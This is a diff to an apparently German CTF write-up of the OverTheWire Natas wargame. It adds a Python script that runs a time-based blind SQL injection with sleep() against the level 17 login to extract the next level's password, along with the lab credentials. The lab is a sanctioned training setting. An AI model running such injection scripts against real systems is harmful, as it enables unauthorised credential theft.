@@ -347,3 +347,56 @@ while not hasFound:
 Zugriff:	[http://natas17.natas.labs.overthewire.org](http://natas17.natas.labs.overthewire.org)
 Username: `natas17`
 Passwort: `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw  `
+
+Time based attack über SQL-Injection mit sleep(). Falls das Passwort vorhanden, sleep(1) ausführen und warten.
+
+```Python
+import string
+import requests
+
+hasFound = False
+list = string.ascii_letters + "0123456789"
+found = ""
+toTry = ""
+passwordChars = []
+
+print("Collecting Password Information ...")
+
+for i in list:
+    data = {'username': 'natas18" and password like binary "%'+i+'%" and sleep(1) and "1" = "1'}
+    r = requests.post('http://natas17.natas.labs.overthewire.org/index.php',
+                      auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),
+                      data=data)
+    if r.elapsed.total_seconds() >= 1:
+        passwordChars.append(i)
+        print("", passwordChars)
+
+
+print("Password Contains: ", passwordChars)
+
+print("Attacking Natas Server... ")
+
+while not hasFound:
+    for i in passwordChars:
+        toTry = i
+        print("Try: "+found +i)
+        data = {'username': 'natas18" and password like binary "'+found+toTry+'%" and sleep(1) and "1" = "1'}
+        r = requests.post('http://natas17.natas.labs.overthewire.org/index.php',
+                          auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'),
+                          data=data)
+
+        if r.elapsed.total_seconds() >= 1:
+            found += i
+            print("found: " + found)
+            if len(found) >= 32:
+                hasFound = True
+                print("Password for Natas 18 is: "+found)
+            break
+
+```
+
+# Natas 18
+
+Zugriff:	[http://natas18.natas.labs.overthewire.org](http://natas18.natas.labs.overthewire.org)
+Username: `natas17`
+Passwort: `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP  `
